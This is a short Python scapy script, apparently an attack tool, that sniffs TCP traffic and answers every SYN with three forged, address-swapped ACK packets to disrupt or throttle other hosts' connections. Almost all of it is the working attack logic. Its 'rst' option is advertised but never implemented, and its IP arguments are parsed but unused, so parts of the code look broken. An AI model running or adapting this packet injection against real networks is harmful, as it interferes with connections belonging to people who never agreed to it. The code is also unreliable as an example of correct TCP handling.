from scapy.all import TCP, IP, sniff, send
import argparse

parser = argparse.ArgumentParser(description='TCP socket listener with throttling.')
parser.add_argument('source_ip', help='Source IP address to bind the socket to')
parser.add_argument('destination_ip', help='Destination IP address to listen for connections')
parser.add_argument('attack_type', type=str, help="The method of attack. Options are 'rst' or '3ack'")
args = parser.parse_args()

print(args.attack_type)

def throttle_TCP(pkt):
    if pkt.haslayer(TCP):
        # Check for SYN flag to identify a new connection
        if pkt[TCP].flags == 'S':
            # Create 3 ACK packets to simulate packet loss and force retransmission
            ack1 = IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, seq=pkt[TCP].ack, ack=pkt[TCP].seq + 1, flags='A')
            ack2 = IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, seq=pkt[TCP].ack, ack=pkt[TCP].seq + 1, flags='A')
            ack3 = IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, seq=pkt[TCP].ack, ack=pkt[TCP].seq + 1, flags='A')
            # Send the packets
            send(ack1)
            send(ack2)
            send(ack3)
        else:
            # Pass the packet along if it's not a new connection
            pass

# Sniff TCP packets on the network interface
sniff(filter="tcp", prn=throttle_TCP)
